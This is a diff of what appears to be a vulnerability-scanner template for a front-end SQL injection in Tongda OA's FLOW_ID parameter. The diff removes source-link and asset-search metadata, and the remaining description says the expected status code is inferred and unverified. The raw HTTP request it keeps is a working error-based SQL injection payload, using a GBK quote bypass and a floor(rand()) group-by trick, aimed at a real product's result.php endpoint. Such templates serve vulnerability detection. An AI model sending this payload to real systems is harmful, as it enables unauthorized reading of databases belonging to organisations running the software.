@@ -3,14 +3,8 @@ info:
   name: 通达OAFLOW_ID存在前台SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/58616361edd951ed6f44c71b6d9162db
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 58616361edd951ed6f44c71b6d9162db
-    fofa: + hunter`app.name="通达 OA"`
 http:
 - raw:
   - 'GET /general/score/flow/scoredate/result.php?FLOW_ID=11%bf%27%20and%20%28SELECT%201%20from%20%28select%20count%28*%29,concat%28floor%28rand%280%29*2%29,%28substring%28%28select%20md5%281122%29%20from%20user%20limit%201%29,1,62%29%29%29a%20from%20information_schema.tables%20group%20by%20a%29b%29%23 HTTP/1.1
